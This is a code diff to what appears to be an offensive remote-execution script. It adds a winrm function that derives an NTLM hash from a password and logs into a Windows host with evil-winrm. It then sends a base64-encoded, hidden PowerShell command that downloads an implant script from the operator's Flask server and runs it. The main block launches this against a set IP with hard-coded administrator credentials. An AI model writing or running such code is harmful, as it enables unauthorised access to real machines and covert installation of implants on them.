@@ -18,6 +18,25 @@ def psexec(username, password, target, FLASK_HOST, FLASK_PORT):
     os.system(os_cmd)
 
 """
+With valid credentials, winrm and run implant code
+"""
+def winrm(username, password, target, FLASK_HOST, FLASK_PORT):
+    ntlm = binascii.hexlify(hashlib.new('md4', password.encode('utf-16le')).digest()).decode(encoding="utf-8")
+
+    p = pwn.process(["/usr/bin/evil-winrm", "-i", f"{target}", "-u", f"{username}", "-H", f"{ntlm}"], stdin=pwn.PTY)
+    
+    # Download payload to disk
+    payload = f'iwr "http://{FLASK_HOST}:{FLASK_PORT}/static/win.ps1" -o C:\\programdata\\win.ps1; powershell -nop -w hidden C:\\programdata\\win.ps1'
+    b64 = base64.b64encode(payload.encode("utf-16")[2:]).decode("utf-8")
+    cmd = f"powershell -e {b64}\n"
+    print(p.readuntil(">"))
+    print(cmd)
+    p.send(cmd.encode())
+    p.send(b'\4')
+
+    p.readall()
+
+"""
 WIth valid credentials, ssh and run implant code
 """
 def ssh(username, password, target, FLASK_HOST, FLASK_PORT):
@@ -46,5 +65,8 @@ def ssh(username, password, target, FLASK_HOST, FLASK_PORT):
     except Exception as e:
         print(f"Error occurred: {e}")
 
+import threading
+
 if __name__=="__main__":
-    psexec("administrator", "CMpass123!", "10.100.3.54", "172.16.1.5", "5000")
+    thread = threading.Thread(target=winrm, args=("Administrator", "password", "192.168.108.15", "192.168.108.14", 5000))
+    thread.start()
